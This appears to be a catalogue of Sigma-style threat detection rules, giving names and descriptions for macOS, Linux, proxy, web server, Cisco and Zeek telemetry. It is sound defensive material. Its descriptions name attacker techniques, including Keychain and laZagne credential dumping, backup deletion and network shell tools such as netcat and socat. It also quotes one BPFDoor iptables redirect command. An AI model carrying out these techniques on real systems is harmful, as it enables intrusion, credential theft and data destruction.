rules.name: MacOS Emond Launch Daemon
rules.description: Detects additions to the Emond Launch Daemon that adversaries may use to gain persistence and elevate privileges.

rules.name: Startup Item File Created - MacOS
rules.description:
Detects the creation of a startup item plist file, that automatically get executed at boot initialization to establish persistence.
Adversaries may use startup items automatically executed at boot initialization to establish persistence.
Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.

rules.name: MacOS Scripting Interpreter AppleScript
rules.description: Detects execution of AppleScript of the macOS scripting language AppleScript.

rules.name: Credentials In Files
rules.description: Detecting attempts to extract passwords with grep and laZagne

rules.name: Local System Accounts Discovery - MacOs
rules.description: Detects enumeration of local systeam accounts on MacOS

rules.name: Guest Account Enabled Via Sysadminctl
rules.description: Detects attempts to enable the guest account using the sysadminctl utility

rules.name: Indicator Removal on Host - Clear Mac System Logs
rules.description: Detects deletion of local audit logs

rules.name: Launch Agent/Daemon Execution Via Launchctl
rules.description: Detects the execution of programs as Launch Agents or Launch Daemons using launchctl on macOS.

rules.name: System Network Connections Discovery - MacOs
rules.description: Detects usage of system utilities to discover system network connections

rules.name: File Time Attribute Change
rules.description: Detect file time attribute change to hide new or changes to existing files

rules.name: System Information Discovery Using Ioreg
rules.description:
Detects the use of "ioreg" which will show I/O Kit registry information.
This process is used for system information discovery.
It has been observed in-the-wild by calling this process directly or using bash and grep to look for specific strings.

rules.name: New File Exclusion Added To Time Machine Via Tmutil - MacOS
rules.description:
Detects the addition of a new file or path exclusion to MacOS Time Machine via the "tmutil" utility.
An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.

rules.name: Payload Decoded and Decrypted via Built-in Utilities
rules.description: Detects when a built-in utility is used to decode and decrypt a payload after a macOS disk image (DMG) is executed. Malware authors may attempt to evade detection and trick users into executing malicious code by encoding and encrypting their payload and placing it in a disk image file. This behavior is consistent with adware or malware families such as Bundlore and Shlayer.

rules.name: Disk Image Creation Via Hdiutil - MacOS
rules.description: Detects the execution of the hdiutil utility in order to create a disk image.

rules.name: Time Machine Backup Deletion Attempt Via Tmutil - MacOS
rules.description:
Detects deletion attempts of MacOS Time Machine backups via the native backup utility "tmutil".
An adversary may perform this action before launching a ransonware attack to prevent the victim from restoring their files.

rules.name: JXA In-memory Execution Via OSAScript
rules.description: Detects possible malicious execution of JXA in-memory via OSAScript

rules.name: Suspicious Installer Package Child Process
rules.description: Detects the execution of suspicious child processes from macOS installer package parent process. This includes osascript, JXA, curl and wget amongst other interpreters

rules.name: System Integrity Protection (SIP) Disabled
rules.description: Detects the use of csrutil to disable the Configure System Integrity Protection (SIP). This technique is used in post-exploit scenarios.

rules.name: Potential Persistence Via PlistBuddy
rules.description: Detects potential persistence activity using LaunchAgents or LaunchDaemons via the PlistBuddy utility

rules.name: System Information Discovery Using System_Profiler
rules.description:
Detects the execution of "system_profiler" with specific "Data Types" that have been seen being used by threat actors and malware. It provides system hardware and software configuration information.
This process is primarily used for system information discovery. However, "system_profiler" can also be used to determine if virtualization software is being run for defense evasion purposes.

rules.name: Suspicious MacOS Firmware Activity
rules.description: Detects when a user manipulates with Firmward Password on MacOS. NOTE - this command has been disabled on silicon-based apple computers.

rules.name: Hidden User Creation
rules.description: Detects creation of a hidden user account on macOS (UserID < 500) or with IsHidden option

rules.name: Gatekeeper Bypass via Xattr
rules.description: Detects macOS Gatekeeper bypass via xattr utility

rules.name: Decode Base64 Encoded Text -MacOs
rules.description: Detects usage of base64 utility to decode arbitrary base64-encoded text

rules.name: System Network Discovery - macOS
rules.description: Detects enumeration of local network configuration

rules.name: System Information Discovery Via Sysctl - MacOS
rules.description:
Detects the execution of "sysctl" with specific arguments that have been used by threat actors and malware. It provides system hardware information.
This process is primarily used to detect and avoid virtualization and analysis environments.

rules.name: Local Groups Discovery - MacOs
rules.description: Detects enumeration of local system groups

rules.name: Split A File Into Pieces
rules.description: Detection use of the command "split" to split files into parts and possible transfer.

rules.name: User Added To Admin Group Via DseditGroup
rules.description: Detects attempts to create and/or add an account to the admin group, thus granting admin privileges.

rules.name: Potential In-Memory Download And Compile Of Payloads
rules.description: Detects potential in-memory downloading and compiling of applets using curl and osacompile as seen used by XCSSET malware

rules.name: User Added To Admin Group Via Sysadminctl
rules.description: Detects attempts to create and add an account to the admin group via "sysadminctl"

rules.name: Disk Image Mounting Via Hdiutil - MacOS
rules.description: Detects the execution of the hdiutil utility in order to mount disk images.

rules.name: System Shutdown/Reboot - MacOs
rules.description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.

rules.name: User Added To Admin Group Via Dscl
rules.description: Detects attempts to create and add an account to the admin group via "dscl"

rules.name: Binary Padding - MacOS
rules.description: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.

rules.name: Hidden Flag Set On File/Directory Via Chflags - MacOS
rules.description:
Detects the execution of the "chflags" utility with the "hidden" flag, in order to hide files on MacOS.
When a file or directory has this hidden flag set, it becomes invisible to the default file listing commands and in graphical file browsers.

rules.name: Security Software Discovery - MacOs
rules.description: Detects usage of system utilities (only grep for now) to discover security software discovery

rules.name: Potential XCSSET Malware Infection
rules.description: Identifies the execution traces of the XCSSET malware. XCSSET is a macOS trojan that primarily spreads via Xcode projects and maliciously modifies applications. Infected users are also vulnerable to having their credentials, accounts, and other vital data stolen.

rules.name: Root Account Enable Via Dsenableroot
rules.description: Detects attempts to enable the root account via "dsenableroot"

rules.name: Network Sniffing - MacOs
rules.description:
Detects the usage of tooling to sniff network traffic.
An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

rules.name: JAMF MDM Execution
rules.description: Detects execution of the "jamf" binary to create user accounts and run commands. For example, the binary can be abused by attackers on the system in order to bypass security controls or remove application control polices.

rules.name: Suspicious Browser Child Process - MacOS
rules.description: Detects suspicious child processes spawned from browsers. This could be a result of a potential web browser exploitation.

rules.name: Space After Filename - macOS
rules.description: Detects attempts to masquerade as legitimate files by adding a space to the end of the filename.

rules.name: Macos Remote System Discovery
rules.description: Detects the enumeration of other remote systems.

rules.name: Creation Of A Local User Account
rules.description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

rules.name: Suspicious History File Operations
rules.description: Detects commandline operations on shell history files

rules.name: JAMF MDM Potential Suspicious Child Process
rules.description: Detects potential suspicious child processes of "jamf". Could be a sign of potential abuse of Jamf as a C2 server as seen by Typhon MythicAgent.

rules.name: MacOS Network Service Scanning
rules.description: Detects enumeration of local or remote network services.

rules.name: Potential Base64 Decoded From Images
rules.description: Detects the use of tail to extract bytes at an offset from an image and then decode the base64 value to create a new file with the decoded content. The detected execution is a bash one-liner.

rules.name: Time Machine Backup Disabled Via Tmutil - MacOS
rules.description:
Detects disabling of Time Machine (Apple's automated backup utility software) via the native macOS backup utility "tmutil".
An attacker can use this to prevent backups from occurring.

rules.name: Potential Discovery Activity Using Find - MacOS
rules.description: Detects usage of "find" binary in a suspicious manner to perform discovery

rules.name: GUI Input Capture - macOS
rules.description: Detects attempts to use system dialog prompts to capture user credentials

rules.name: Potential WizardUpdate Malware Infection
rules.description: Detects the execution traces of the WizardUpdate malware. WizardUpdate is a macOS trojan that attempts to infiltrate macOS machines to steal data and it is associated with other types of malicious payloads, increasing the chances of multiple infections on a device.

rules.name: Disable Security Tools
rules.description: Detects disabling security tools

rules.name: File Download Via Nscurl - MacOS
rules.description: Detects the execution of the nscurl utility in order to download files.

rules.name: Credentials from Password Stores - Keychain
rules.description: Detects passwords dumps from Keychain

rules.name: Suspicious Execution via macOS Script Editor
rules.description: Detects when the macOS Script Editor utility spawns an unusual child process.

rules.name: System Integrity Protection (SIP) Enumeration
rules.description: Detects the use of csrutil to view the Configure System Integrity Protection (SIP) status. This technique is used in post-exploit scenarios.

rules.name: Suspicious Microsoft Office Child Process - MacOS
rules.description: Detects suspicious child processes spawning from microsoft office suite applications such as word or excel. This could indicates malicious macro execution

rules.name: Clipboard Data Collection Via OSAScript
rules.description: Detects possible collection of data from the clipboard via execution of the osascript binary

rules.name: Osacompile Execution By Potentially Suspicious Applet/Osascript
rules.description: Detects potential suspicious applet or osascript executing "osacompile".

rules.name: Screen Capture - macOS
rules.description: Detects attempts to use screencapture to collect macOS screenshots

rules.name: OSACompile Run-Only Execution
rules.description: Detects potential suspicious run-only executions compiled using OSACompile

rules.name: System Information Discovery Using sw_vers
rules.description: Detects the use of "sw_vers" for system information discovery

rules.name: Remote Access Tool - Team Viewer Session Started On MacOS Host
rules.description:
Detects the command line executed when TeamViewer starts a session started by a remote host.
Once a connection has been started, an investigator can verify the connection details by viewing the "incoming_connections.txt" log file in the TeamViewer folder.

rules.name: File and Directory Discovery - MacOS
rules.description: Detects usage of system utilities to discover files and directories

rules.name: Scheduled Cron Task/Job - MacOs
rules.description: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.

rules.name: Suspicious SQL Query
rules.description: Detects suspicious SQL query keywrods that are often used during recon, exfiltration or destructive activities. Such as dropping tables and selecting wildcard fields

rules.name: Antivirus Hacktool Detection
rules.description:
Detects a highly relevant Antivirus alert that reports a hack tool or other attack tool.
This event must not be ignored just because the AV has blocked the malware but investigate, how it came there in the first place.

rules.name: Antivirus Ransomware Detection
rules.description:
Detects a highly relevant Antivirus alert that reports ransomware.
This event must not be ignored just because the AV has blocked the malware but investigate, how it came there in the first place.

rules.name: Antivirus Web Shell Detection
rules.description:
Detects a highly relevant Antivirus alert that reports a web shell.
It's highly recommended to tune this rule to the specific strings used by your anti virus solution by downloading a big WebShell repository from e.g. github and checking the matches.
This event must not be ignored just because the AV has blocked the malware but investigate, how it came there in the first place.

rules.name: Antivirus Relevant File Paths Alerts
rules.description:
Detects an Antivirus alert in a highly relevant file path or with a relevant file name.
This event must not be ignored just because the AV has blocked the malware but investigate, how it came there in the first place.

rules.name: Antivirus Exploitation Framework Detection
rules.description:
Detects a highly relevant Antivirus alert that reports an exploitation framework.
This event must not be ignored just because the AV has blocked the malware but investigate, how it came there in the first place.

rules.name: Antivirus Password Dumper Detection
rules.description:
Detects a highly relevant Antivirus alert that reports a password dumper.
This event must not be ignored just because the AV has blocked the malware but investigate, how it came there in the first place.

rules.name: PwnDrp Access
rules.description: Detects downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity

rules.name: Telegram API Access
rules.description: Detects suspicious requests to Telegram API without the usual Telegram User-Agent

rules.name: HTTP Request With Empty User Agent
rules.description:
Detects a potentially suspicious empty user agent strings in proxy log.
Could potentially indicate an uncommon request method.

rules.name: Suspicious User Agent
rules.description: Detects suspicious malformed user agent strings in proxy logs

rules.name: Bitsadmin to Uncommon IP Server Address
rules.description: Detects Bitsadmin connections to IP addresses instead of FQDN names

rules.name: HackTool - BabyShark Agent Default URL Pattern
rules.description: Detects Baby Shark C2 Framework default communication patterns

rules.name: Crypto Miner User Agent
rules.description: Detects suspicious user agent strings used by crypto miners in proxy logs

rules.name: PUA - Advanced IP/Port Scanner Update Check
rules.description: Detect the update check performed by Advanced IP/Port Scanner utilities.

rules.name: Flash Player Update from Suspicious Location
rules.description: Detects a flashplayer update from an unofficial location

rules.name: Raw Paste Service Access
rules.description: Detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form

rules.name: Download From Suspicious TLD - Whitelist
rules.description: Detects executable downloads from suspicious remote systems

rules.name: Rclone Activity via Proxy
rules.description: Detects the use of rclone, a command-line program to manage files on cloud storage, via its default user-agent string

rules.name: Download From Suspicious TLD - Blacklist
rules.description: Detects download of certain file types from hosts in suspicious TLDs

rules.name: Hack Tool User Agent
rules.description: Detects suspicious user agent strings user by hack tools in proxy logs

rules.name: Windows WebDAV User Agent
rules.description: Detects WebDav DownloadCradle

rules.name: Suspicious Network Communication With IPFS
rules.description: Detects connections to interplanetary file system (IPFS) containing a user's email address which mirrors behaviours observed in recent phishing campaigns leveraging IPFS to host credential harvesting webpages.

rules.name: Malware User Agent
rules.description: Detects suspicious user agent strings used by malware in proxy logs

rules.name: Suspicious External WebDAV Execution
rules.description: Detects executables launched from external WebDAV shares using the WebDAV Explorer integration, commonly seen in initial access campaigns.

rules.name: Exploit Framework User Agent
rules.description: Detects suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs

rules.name: HackTool - CobaltStrike Malleable Profile Patterns - Proxy
rules.description: Detects cobalt strike malleable profiles patterns (URI, User-Agents, Methods).

rules.name: Download from Suspicious Dyndns Hosts
rules.description: Detects download of certain file types from hosts with dynamic DNS names (selected list)

rules.name: Potential Base64 Encoded User-Agent
rules.description: Detects User Agent strings that end with an equal sign, which can be a sign of base64 encoding.

rules.name: Bitsadmin to Uncommon TLD
rules.description: Detects Bitsadmin connections to domains with uncommon TLDs

rules.name: APT User Agent
rules.description: Detects suspicious user agent strings used in APT malware in proxy logs

rules.name: F5 BIG-IP iControl Rest API Command Execution - Proxy
rules.description: Detects POST requests to the F5 BIG-IP iControl Rest API "bash" endpoint, which allows the execution of commands on the BIG-IP

rules.name: Suspicious Base64 Encoded User-Agent
rules.description: Detects suspicious encoded User-Agent strings, as seen used by some malware.

rules.name: HackTool - Empire UserAgent URI Combo
rules.description: Detects user agent and URI paths used by empire agents

rules.name: Windows PowerShell User Agent
rules.description: Detects Windows PowerShell Web Access

rules.name: Nginx Core Dump
rules.description: Detects a core dump of a crashing Nginx worker process, which could be a signal of a serious problem or exploitation attempts.

rules.name: Apache Threading Error
rules.description: Detects an issue in apache logs that reports threading related errors

rules.name: Apache Segmentation Fault
rules.description: Detects a segmentation fault error message caused by a crashing apache worker process

rules.name: Suspicious Windows Strings In URI
rules.description: Detects suspicious Windows strings in URI which could indicate possible exfiltration or webshell communication

rules.name: JNDIExploit Pattern
rules.description: Detects exploitation attempt using the JNDI-Exploit-Kit

rules.name: Path Traversal Exploitation Attempts
rules.description: Detects path traversal exploitation attempts

rules.name: F5 BIG-IP iControl Rest API Command Execution - Webserver
rules.description: Detects POST requests to the F5 BIG-IP iControl Rest API "bash" endpoint, which allows the execution of commands on the BIG-IP

rules.name: Suspicious User-Agents Related To Recon Tools
rules.description: Detects known suspicious (default) user-agents related to scanning/recon tools

rules.name: Java Payload Strings
rules.description: Detects possible Java payloads in web access logs

rules.name: Webshell ReGeorg Detection Via Web Logs
rules.description: Certain strings in the uri_query field when combined with null referer and null user agent can indicate activity associated with the webshell ReGeorg.

rules.name: Server Side Template Injection Strings
rules.description: Detects SSTI attempts sent via GET requests in access logs

rules.name: SQL Injection Strings In URI
rules.description: Detects potential SQL injection attempts via GET requests in access logs.

rules.name: Successful IIS Shortname Fuzzing Scan
rules.description: When IIS uses an old .Net Framework it's possible to enumerate folders with the symbol "~"

rules.name: Cross Site Scripting Strings
rules.description: Detects XSS attempts injected via GET requests in access logs

rules.name: Source Code Enumeration Detection by Keyword
rules.description: Detects source code enumeration that use GET requests by keyword searches in URL strings

rules.name: Windows Webshell Strings
rules.description: Detects common commands used in Windows webshells

rules.name: Huawei BGP Authentication Failures
rules.description: Detects BGP failures which may be indicative of brute force attacks to manipulate routing.

rules.name: Cisco Sniffing
rules.description: Show when a monitor or a span/rspan is setup or modified

rules.name: Cisco Denial of Service
rules.description: Detect a system being shutdown or put into different boot mode

rules.name: Cisco Show Commands Input
rules.description: See what commands are being input into the device by other people, full credentials can be in the history

rules.name: Cisco Modify Configuration
rules.description: Modifications to a config that will serve an adversary's impacts or persistence

rules.name: Cisco Disabling Logging
rules.description: Turn off logging locally or remote

rules.name: Cisco Clear Logs
rules.description: Clear command history in network OS which is used for defense evasion

rules.name: Cisco Discovery
rules.description: Find information about network devices that is not stored in config files

rules.name: Cisco Crypto Commands
rules.description: Show when private keys are being exported from the device, or when new certificates are installed

rules.name: Cisco File Deletion
rules.description: See what files are being deleted from flash file systems

rules.name: Cisco Stage Data
rules.description: Various protocols maybe used to put data on the device for exfil or infil

rules.name: Cisco Collect Data
rules.description: Collect pertinent data from the configuration files

rules.name: Cisco Local Accounts
rules.description: Find local accounts being created or modified as well as remote authentication configurations

rules.name: Cisco LDP Authentication Failures
rules.description: Detects LDP failures which may be indicative of brute force attacks to manipulate MPLS labels

rules.name: Cisco BGP Authentication Failures
rules.description: Detects BGP failures which may be indicative of brute force attacks to manipulate routing

rules.name: Cleartext Protocol Usage
rules.description:
Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels.
Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access.

rules.name: First Time Seen Remote Named Pipe - Zeek
rules.description: This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes

rules.name: Publicly Accessible RDP Service
rules.description: Detects connections from routable IPs to an RDP listener. Which is indicative of a publicly-accessible RDP service.

rules.name: Suspicious DNS Z Flag Bit Set
rules.description:
The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused).
Although recently it has been used in DNSSec, the value being set to anything other than 0 should be rare.
Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward.
Determine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering.
This Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs'

rules.name: DNS Events Related To Mining Pools
rules.description: Identifies clients that may be performing DNS lookups associated with common currency mining pools.

rules.name: Potential PetitPotam Attack Via EFS RPC Calls
rules.description:
Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam.
The usage of this RPC function should be rare if ever used at all.
Thus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate.
 View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..'

rules.name: OMIGOD HTTP No Authentication RCE
rules.description:
Detects the exploitation of OMIGOD (CVE-2021-38647) which allows remote execute (RCE) commands as root with just a single unauthenticated HTTP request.
Verify, successful, exploitation by viewing the HTTP client (request) body to see what was passed to the server (using PCAP).
Within the client body is where the code execution would occur. Additionally, check the endpoint logs to see if suspicious commands or activity occurred within the timeframe of this HTTP request.

rules.name: Suspicious Access to Sensitive File Extensions - Zeek
rules.description: Detects known sensitive file extensions via Zeek

rules.name: New Kind of Network (NKN) Detection
rules.description: NKN is a networking service using blockchain technology to support a decentralized network of peers. While there are legitimate uses for it, it can also be used as a C2 channel. This rule looks for a DNS request to the ma>

rules.name: Possible PrintNightmare Print Driver Install
rules.description:
Detects the remote installation of a print driver which is possible indication of the exploitation of PrintNightmare (CVE-2021-1675).
The occurrence of print drivers being installed remotely via RPC functions should be rare, as print drivers are normally installed locally and or through group policy.

rules.name: Kerberos Network Traffic RC4 Ticket Encryption
rules.description: Detects kerberos TGS request using RC4 encryption which may be indicative of kerberoasting

rules.name: Executable from Webdav
rules.description: Detects executable access via webdav6. Can be seen in APT 29 such as from the emulated APT 29 hackathon https://github.com/OTRF/detection-hackathon-apt29/

rules.name: DNS TOR Proxies
rules.description: Identifies IPs performing DNS lookups associated with common Tor proxies.

rules.name: SMB Spoolss Name Piped Usage
rules.description: Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.

rules.name: Possible Impacket SecretDump Remote Activity - Zeek
rules.description: Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml

rules.name: Remote Task Creation via ATSVC Named Pipe - Zeek
rules.description: Detects remote task creation via at.exe or API interacting with ATSVC namedpipe

rules.name: WebDav Put Request
rules.description: A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration.

rules.name: MITRE BZAR Indicators for Persistence
rules.description: Windows DCE-RPC functions which indicate a persistence techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE.

rules.name: Suspicious PsExec Execution - Zeek
rules.description: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one

rules.name: Transferring Files with Credential Data via Network Shares - Zeek
rules.description: Transferring files with well-known filenames (sensitive files with credential data) using network shares

rules.name: MITRE BZAR Indicators for Execution
rules.description: Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE

rules.name: Default Cobalt Strike Certificate
rules.description: Detects the presence of default Cobalt Strike certificate in the HTTPS traffic

rules.name: HTTP Request to Low Reputation TLD or Suspicious File Extension
rules.description: Detects HTTP requests to low reputation TLDs (e.g. .xyz, .top, .ru) or ending in suspicious file extensions (.exe, .dll, .hta), which may indicate malicious activity.

rules.name: Juniper BGP Missing MD5
rules.description: Detects juniper BGP missing MD5 digest. Which may be indicative of brute force attacks to manipulate routing.

rules.name: Cobalt Strike DNS Beaconing
rules.description: Detects suspicious DNS queries known from Cobalt Strike beacons

rules.name: DNS TXT Answer with Possible Execution Strings
rules.description: Detects strings used in command execution in DNS TXT Answer

rules.name: Suspicious DNS Query with B64 Encoded String
rules.description: Detects suspicious DNS queries using base64 encoding

rules.name: Wannacry Killswitch Domain
rules.description: Detects wannacry killswitch domain dns queries

rules.name: DNS Query to External Service Interaction Domains
rules.description: Detects suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful RCE

rules.name: Telegram Bot API Request
rules.description: Detects suspicious DNS queries to api.telegram.org used by Telegram Bots of any kind

rules.name: Monero Crypto Coin Mining Pool Lookup
rules.description: Detects suspicious DNS queries to Monero mining pools

rules.name: Cleartext Protocol Usage Via Netflow
rules.description:
Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels
Ensure that an encryption is used for all sensitive information in transit.
Ensure that an encrypted channels is used for all administrative account access.

rules.name: Host Without Firewall
rules.description: Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management.

rules.name: Default Credentials Usage
rules.description:
Before deploying any new asset, change all default passwords to have values consistent with administrative level accounts.
Sigma detects default credentials usage. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management.

rules.name: Triple Cross eBPF Rootkit Default Persistence
rules.description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d" directories. Which both are related to the TripleCross persistence method

rules.name: Linux Doas Conf File Creation
rules.description: Detects the creation of doas.conf file in linux host platform.

rules.name: Persistence Via Sudoers Files
rules.description: Detects creation of sudoers file or files in "sudoers.d" directory which can be used a potential method to persiste privileges for a specific user.

rules.name: Potentially Suspicious Shell Script Creation in Profile Folder

rules.name: Wget Creating Files in Tmp Directory

rules.name: Persistence Via Cron Files

rules.name: Triple Cross eBPF Rootkit Default LockFile

rules.name: Masquerading as Linux Crond Process
rules.description:
Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.
Several different variations of this technique have been observed.

rules.name: Use Of Hidden Paths Or Files
rules.description: Detects calls to hidden files or files located in hidden directories in NIX systems.

rules.name: Clipboard Collection with Xclip Tool - Auditd
rules.description:
Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool.
Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.

rules.name: Overwriting the File with Dev Zero or Null
rules.description: Detects overwriting (effectively wiping/deleting) of a file.

rules.name: Remove Immutable File Attribute - Auditd
rules.description: Detects removing immutable file attribute.

rules.name: Bpfdoor TCP Ports Redirect
rules.description:
All TCP traffic on particular port from attacker is routed to different port. ex. '/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport 22 -j REDIRECT --to-ports 42392'
The traffic looks like encrypted SSH communications going to TCP port 22, but in reality is being directed to the shell port once it hits the iptables rule for the attacker host only.

rules.name: File or Folder Permissions Change
rules.description: Detects file and folder permission changes.

rules.name: System Information Discovery - Auditd
rules.description: Detects System Information Discovery commands

rules.name: Steganography Hide Files with Steghide
rules.description: Detects embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.

rules.name: File Time Attribute Change - Linux
rules.description: Detect file time attribute change to hide new or changes to existing files.

rules.name: Data Compressed
rules.description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.

rules.name: BPFDoor Abnormal Process ID or Lock File Accessed
rules.description: detects BPFDoor .lock and .pid files access in temporary file storage facility

rules.name: Audio Capture
rules.description: Detects attempts to record audio with arecord utility

rules.name: Auditing Configuration Changes on Linux Host
rules.description: Detect changes in auditd configuration files

rules.name: Linux Network Service Scanning - Auditd
rules.description: Detects enumeration of local or remote network services.

rules.name: Screen Capture with Import Tool
rules.description:
Detects adversary creating screen capture of a desktop with Import Tool.
Highly recommended using rule on servers, due to high usage of screenshot utilities on user workstations.
ImageMagick must be installed.

rules.name: Possible Coin Miner CPU Priority Param
rules.description: Detects command line parameter very often used with coin miners

rules.name: Suspicious History File Operations - Linux
rules.description: Detects commandline operations on shell history files

rules.name: Screen Capture with Xwd
rules.description: Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations

rules.name: Systemd Service Creation
rules.description: Detects a creation of systemd services which could be used by adversaries to execute malicious code.

rules.name: System Owner or User Discovery - Linux
rules.description:
Detects the execution of host or user discovery utilities such as "whoami", "hostname", "id", etc.
Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

rules.name: Modify System Firewall
rules.description:
Detects the removal of system firewall rules. Adversaries may only delete or modify a specific system firewall rule to bypass controls limiting network usage or access.
Detection rules that match only on the disabling of firewalls will miss this.

rules.name: Suspicious Commands Linux
rules.description: Detects relevant commands often related to malware or hacking activity

rules.name: Loading of Kernel Module via Insmod
rules.description:
Detects loading of kernel modules with insmod command.
Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.
Adversaries may use LKMs to obtain persistence within the system or elevate the privileges.

rules.name: System and Hardware Information Discovery
rules.description: Detects system information discovery commands

rules.name: Logging Configuration Changes on Linux Host
rules.description: Detect changes of syslog daemons configuration files

rules.name: Network Sniffing - Linux
rules.description:
Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.
An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

rules.name: Steganography Extract Files with Steghide
rules.description: Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.

rules.name: Binary Padding - Linux
rules.description:
Adversaries may use binary padding to add junk data and change the on-disk representation of malware.
This rule detect using dd and truncate to add a junk data to file.

rules.name: Linux Capabilities Discovery
rules.description: Detects attempts to discover the files with setuid/setgid capability on them. That would allow adversary to escalate their privileges.

rules.name: Unix Shell Configuration Modification
rules.description: Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.

rules.name: Disable System Firewall
rules.description: Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.

rules.name: Suspicious C2 Activities
rules.description:
Detects suspicious activities as declared by Florian Roth in its 'Best Practice Auditd Configuration'.
This includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap.
These commands match a few techniques from the tactics "Command and Control", including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132)

rules.name: Clipboard Collection of Image Data with Xclip Tool
rules.description:
Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool.
Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.

rules.name: Creation Of An User Account
rules.description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

rules.name: Split A File Into Pieces - Linux
rules.description: Detection use of the command "split" to split files into parts and possible transfer.

rules.name: System Shutdown/Reboot - Linux
rules.description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.

rules.name: Modification of ld.so.preload
rules.description: Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.

rules.name: Program Executions in Suspicious Folders
rules.description: Detects program executions in suspicious non-program folders related to malware or hacking activity

rules.name: Webshell Remote Command Execution
rules.description: Detects possible command execution by web application/web shell

rules.name: Data Exfiltration with Wget
rules.description:
Detects attempts to post the file with the usage of wget utility.
The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.

rules.name: Steganography Hide Zip Information in Picture File
rules.description: Detects appending of zip file to image

rules.name: Steganography Unzip Hidden Information From Picture File
rules.description: Detects extracting of zip file from image file

rules.name: Credentials In Files - Linux
rules.description: Detecting attempts to extract passwords with grep

rules.name: Service Reload or Start - Linux
rules.description: Detects the start, reload or restart of a service.

rules.name: Password Policy Discovery - Linux
rules.description: Detects password policy discovery commands

rules.name: Hidden Files and Directories
rules.description: Detects adversary creating hidden file or directory, by detecting directories or files with . as the first character

rules.name: Linux Keylogging with Pam.d
rules.description: Detect attempt to enable auditing of TTY input

rules.name: Triple Cross eBPF Rootkit Execve Hijack
rules.description: Detects execution of a the file "execve_hijack" which is used by the Triple Cross rootkit as a way to elevate privileges

rules.name: ESXi Storage Information Discovery Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "storage" flag in order to retrieve information about the storage status and other related information. Seen used by malware such as DarkSide and LockBit.

rules.name: BPFtrace Unsafe Option Usage
rules.description: Detects the usage of the unsafe bpftrace option

rules.name: Potential Linux Amazon SSM Agent Hijacking
rules.description: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.

